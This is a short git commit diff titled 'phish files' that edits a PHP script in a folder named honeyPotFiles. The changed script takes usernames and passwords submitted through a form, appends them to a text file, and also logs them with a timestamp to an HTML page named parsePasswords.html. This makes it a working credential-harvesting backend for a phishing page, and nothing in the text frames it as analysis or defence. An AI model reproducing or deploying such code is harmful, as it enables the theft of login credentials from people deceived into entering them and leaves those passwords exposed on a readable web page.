f55d4b17a2b714f4c229a097f689580f50caebbf
moseleygj <moseleygj@gmail.com>
2017-12-01 00:57:12 -0500

    phish files

--- honeyPotFiles/writefile.php
+++ honeyPotFiles/writefile.php
@@ -5,17 +5,22 @@
 
 <?php
 
-$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-
-$usrN = $_POST["userName"].":";
-fwrite($myfile, $usrN);
-
+$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
 $passW = $_POST["passWord"];
-fwrite($myfile, $passW);
+$usrN = $_POST["userName"];
+fwrite($myfile, $usrN .":" . $passW . "\n");
 
 echo "<br>file written.";
 fclose($myfile);
 
+
+$myHTMLFile = fopen("parsePasswords.html", "a") or die("Unable to open file!");
+$passW = $_POST["passWord"];
+$usrN = $_POST["userName"];
+fwrite($myHTMLFile, "<b>Username:&nbsp</b>" . $usrN ."<br><b>Password:&nbsp</b>" . $passW . "<br><font color='red'>" . date("l jS \of F Y h:i:s A") . "</font><br><hr>");
+
+echo "<br>file written.";
+fclose($myHTMLFile);
 
 
 ?>
